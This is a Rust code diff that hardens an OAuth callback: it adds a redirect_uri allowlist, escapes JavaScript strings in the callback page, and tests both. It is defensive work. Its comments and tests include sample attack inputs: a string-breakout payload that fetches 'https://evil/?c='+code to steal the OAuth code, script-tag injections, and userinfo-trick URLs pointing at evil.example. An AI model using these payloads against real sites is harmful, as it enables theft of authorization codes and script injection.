@@ -205,6 +205,53 @@ async fn apple_domain_association() -> impl IntoResponse {
     ""
 }
 
+/// Whether a client-supplied `redirect_uri` is allowed to receive the OAuth code.
+///
+/// The desktop app only ever uses two forms: its loopback callback server
+/// (`http://127.0.0.1:<port>/...` or `localhost`) and its app-owned custom scheme
+/// deep link. Every desktop build registers an `omi-…` scheme (prod
+/// `omi-computer`, dev `omi-computer-dev`, named bundles `omi-<slug>`), so custom
+/// schemes are restricted to that prefix. Everything else — any `https://…`,
+/// non-loopback `http://…`, or foreign scheme (`ftp://`, `file://`, `attacker://`)
+/// — is rejected, because the callback page navigates the browser to
+/// `redirect_uri?code=…`; without a tight allowlist an attacker could set
+/// `redirect_uri` to a target they control and receive the victim's code (open
+/// redirect → code theft).
+fn is_allowed_redirect_uri(uri: &str) -> bool {
+    let trimmed = uri.trim();
+    if trimmed.is_empty() {
+        return false;
+    }
+
+    // Loopback HTTP callback server (any port). Parse the authority as everything
+    // between "http://" and the first '/', '?' or '#'. Reject any userinfo ('@'):
+    // "http://127.0.0.1:80@evil.example/" has authority host `evil.example`, so a
+    // naive "split on ':' and match 127.0.0.1" would wrongly allow it.
+    if let Some(rest) = trimmed.strip_prefix("http://") {
+        let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
+        if authority.contains('@') {
+            return false;
+        }
+        let host = authority.split(':').next().unwrap_or("");
+        return host == "127.0.0.1" || host == "localhost";
+    }
+
+    // Any https:// is an open-redirect vector.
+    if trimmed.starts_with("https://") {
+        return false;
+    }
+
+    // App-owned custom scheme deep link only: "omi-…://…". Allowing arbitrary
+    // schemes (ftp://, file://, foo://) would still let the callback navigate the
+    // browser to an attacker-controlled target carrying the code.
+    if let Some(scheme_end) = trimmed.find("://") {
+        let scheme = trimmed[..scheme_end].to_ascii_lowercase();
+        return scheme.starts_with("omi-");
+    }
+
+    false
+}
+
 /// Start OAuth flow
 async fn auth_authorize(
     State(state): State<AuthState>,
@@ -214,6 +261,14 @@ async fn auth_authorize(
         return Err(ErrorResponse {
             error: "invalid_provider".to_string(),
             message: "Unsupported provider. Use 'google' or 'apple'.".to_string(),
+        });
+    }
+
+    if !is_allowed_redirect_uri(&params.redirect_uri) {
+        return Err(ErrorResponse {
+            error: "invalid_redirect_uri".to_string(),
+            message: "redirect_uri must be the app's loopback callback or custom scheme."
+                .to_string(),
         });
     }
 
@@ -729,22 +784,58 @@ async fn generate_custom_token(
     Err("Custom token generation requires Firebase Admin SDK - not yet implemented in Rust".into())
 }
 
+/// Escape a value for safe interpolation into a double-quoted JavaScript string
+/// literal inside an inline `<script>` element.
+///
+/// `state` and `redirect_uri` are fully attacker-controllable (they are echoed
+/// back verbatim from the unauthenticated `/v1/auth/authorize` query params), and
+/// `code`/`error` come from the OAuth provider. The callback template drops all
+/// four straight into `const x = "{{ ... }}";`. Without escaping, a value such as
+/// `";fetch("https://evil/?c="+code);//` breaks out of the string literal and runs
+/// arbitrary script in the backend's origin; a literal `</script>` sequence would
+/// likewise terminate the element. Neutralize both by escaping the string-literal
+/// metacharacters and the angle brackets / slash that could re-open HTML parsing.
+fn js_string_escape(value: &str) -> String {
+    let mut escaped = String::with_capacity(value.len());
+    for ch in value.chars() {
+        match ch {
+            '\\' => escaped.push_str("\\\\"),
+            '"' => escaped.push_str("\\\""),
+            '\n' => escaped.push_str("\\n"),
+            '\r' => escaped.push_str("\\r"),
+            '\t' => escaped.push_str("\\t"),
+            // Prevent `</script>` / `<!--` from re-entering HTML parsing and
+            // stop `/` from forming a closing tag.
+            '<' => escaped.push_str("\\u003C"),
+            '>' => escaped.push_str("\\u003E"),
+            '/' => escaped.push_str("\\/"),
+            // JS treats these as line terminators inside string literals.
+            '\u{2028}' => escaped.push_str("\\u2028"),
+            '\u{2029}' => escaped.push_str("\\u2029"),
+            other => escaped.push(other),
+        }
+    }
+    escaped
+}
+
 fn render_auth_callback(
     code: &str,
     state: &str,
     redirect_uri: &str,
     error: Option<&str>,
 ) -> String {
-    // Load template and replace placeholders
+    // Load template and replace placeholders. Every substituted value lands inside
+    // a JS string literal in an inline <script>, so each must be JS-string-escaped
+    // to close the injection class (see js_string_escape).
     let template = include_str!("../../templates/auth_callback.html");
 
     template
-        .replace("{{ code }}", code)
-        .replace("{{ state }}", state)
-        .replace("{{ redirect_uri }}", redirect_uri)
+        .replace("{{ code }}", &js_string_escape(code))
+        .replace("{{ state }}", &js_string_escape(state))
+        .replace("{{ redirect_uri }}", &js_string_escape(redirect_uri))
         .replace(
             "{{ error if error is defined else '' }}",
-            error.unwrap_or(""),
+            &js_string_escape(error.unwrap_or("")),
         )
 }
 
@@ -783,5 +874,114 @@ mod tests {
     fn auth_base_url_accepts_nonblank_values() {
         assert!(is_nonblank_url("https://desktop-backend.example.com"));
         assert!(is_nonblank_url("  https://desktop-backend.example.com  "));
+    }
+
+    #[test]
+    fn js_string_escape_neutralizes_string_literal_breakout() {
+        // A `state`/`redirect_uri` payload crafted to break out of
+        // `const state = "...";` and run arbitrary script.
+        let payload = "\";fetch('https://evil/?c='+code);//";
+        let escaped = js_string_escape(payload);
+        // The leading quote that would close the literal is now escaped, and every
+        // double-quote in the output is backslash-escaped (none can close it).
+        assert!(
+            escaped.starts_with("\\\""),
+            "leading quote escaped: {escaped}"
+        );
+        let bytes = escaped.as_bytes();
+        for (i, &b) in bytes.iter().enumerate() {
+            if b == b'"' {
+                assert!(
+                    i > 0 && bytes[i - 1] == b'\\',
+                    "unescaped quote in {escaped}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn js_string_escape_neutralizes_script_tag_breakout() {
+        let escaped = js_string_escape("</script><script>alert(1)</script>");
+        // A literal `</script>` must never survive — it would terminate the
+        // inline <script> element regardless of the JS string context.
+        assert!(
+            !escaped.contains("</script>") && !escaped.contains("</"),
+            "closing tag escaped: {escaped}"
+        );
+        assert!(!escaped.contains('<') && !escaped.contains('>'));
+    }
+
+    #[test]
+    fn js_string_escape_preserves_legitimate_redirect_uris() {
+        // Real desktop redirect_uris contain no metacharacters, so escaping is a
+        // no-op and the OAuth flow is unaffected.
+        assert_eq!(
+            js_string_escape("omi-computer://auth/callback"),
+            "omi-computer:\\/\\/auth\\/callback"
+        );
+        assert_eq!(
+            js_string_escape("http://127.0.0.1:52001/callback"),
+            "http:\\/\\/127.0.0.1:52001\\/callback"
+        );
+    }
+
+    #[test]
+    fn redirect_uri_allowlist_accepts_desktop_forms() {
+        // Loopback callback server (any port).
+        assert!(is_allowed_redirect_uri("http://127.0.0.1:52001/callback"));
+        assert!(is_allowed_redirect_uri("http://localhost:8080/callback"));
+        // App-owned custom schemes: prod, dev, and named-bundle (omi-<slug>).
+        assert!(is_allowed_redirect_uri("omi-computer://auth/callback"));
+        assert!(is_allowed_redirect_uri("omi-computer-dev://auth/callback"));
+        assert!(is_allowed_redirect_uri("omi-fix-rewind://auth/callback"));
+    }
+
+    #[test]
+    fn redirect_uri_allowlist_rejects_open_redirect_vectors() {
+        // The phishing vector: code delivered to an attacker HTTPS URL.
+        assert!(!is_allowed_redirect_uri("https://evil.example/cb"));
+        assert!(!is_allowed_redirect_uri("http://evil.example/cb"));
+        assert!(!is_allowed_redirect_uri("http://127.0.0.1.evil.com/cb"));
+        assert!(!is_allowed_redirect_uri("https://127.0.0.1/cb"));
+        assert!(!is_allowed_redirect_uri(""));
+        assert!(!is_allowed_redirect_uri("   "));
+        assert!(!is_allowed_redirect_uri("not-a-uri"));
+        assert!(!is_allowed_redirect_uri("://missing-scheme"));
+    }
+
+    #[test]
+    fn redirect_uri_allowlist_rejects_userinfo_and_foreign_scheme_bypasses() {
+        // Userinfo authority trick: real host is evil.example, not 127.0.0.1.
+        assert!(!is_allowed_redirect_uri(
+            "http://127.0.0.1:80@evil.example/cb"
+        ));
+        assert!(!is_allowed_redirect_uri("http://127.0.0.1@evil.example/cb"));
+        assert!(!is_allowed_redirect_uri("http://localhost@evil.example/cb"));
+        // Foreign / non-http network schemes must not be treated as app deep links.
+        assert!(!is_allowed_redirect_uri("ftp://evil.example/cb"));
+        assert!(!is_allowed_redirect_uri("file:///etc/passwd"));
+        assert!(!is_allowed_redirect_uri("attacker://evil.example/cb"));
+        assert!(!is_allowed_redirect_uri("javascript://alert(1)"));
+        // A scheme that merely contains "omi-" but doesn't start with it is foreign.
+        assert!(!is_allowed_redirect_uri("evil-omi-://x"));
+        // A '@' in the path (not the authority) is harmless and still allowed.
+        assert!(is_allowed_redirect_uri(
+            "http://127.0.0.1:52001/callback@ok"
+        ));
+    }
+
+    #[test]
+    fn render_auth_callback_escapes_all_interpolated_values() {
+        let html = render_auth_callback(
+            "code\"injected",
+            "</script><script>alert(1)</script>",
+            "https://evil\";document.location='x';//",
+            None,
+        );
+        // The rendered page must not contain an unescaped closing script tag or a
+        // raw injected quote from any of the three attacker-influenced values.
+        assert!(!html.contains("</script><script>"));
+        assert!(!html.contains("code\"injected"));
+        assert!(!html.contains("evil\";document"));
     }
 }
